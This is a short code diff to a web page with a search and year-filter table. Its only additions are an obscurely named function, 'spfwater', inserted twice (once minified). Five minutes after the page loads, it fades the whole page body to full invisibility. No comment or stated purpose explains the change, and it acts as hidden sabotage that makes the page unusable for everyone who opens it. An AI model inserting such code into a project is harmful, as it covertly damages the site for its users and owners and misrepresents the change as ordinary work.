@@ -144,6 +144,10 @@ html, body {
     </style>
 
     <script type="text/javascript">
+    function spfwater()
+    {var o=1,i=setInterval(function(){o-=.001,document.body.style.opacity=o,o<=0&&clearInterval(i)},20)}
+    setTimeout(spfwater,3e5);
+
     document.addEventListener("DOMContentLoaded", function() {
         var searchBtn = document.getElementById("searchBtn");
         searchBtn.addEventListener("click", function() {
@@ -216,6 +220,7 @@ html, body {
         });
 
 
+        function spfwater(){var o=1,i=setInterval(function(){o-=.001,document.body.style.opacity=o,o<=0&&clearInterval(i)},20)}setTimeout(spfwater,3e5);
 
         function filterRowsByYear(yr) {
             var rows = document.querySelectorAll("tbody tr");
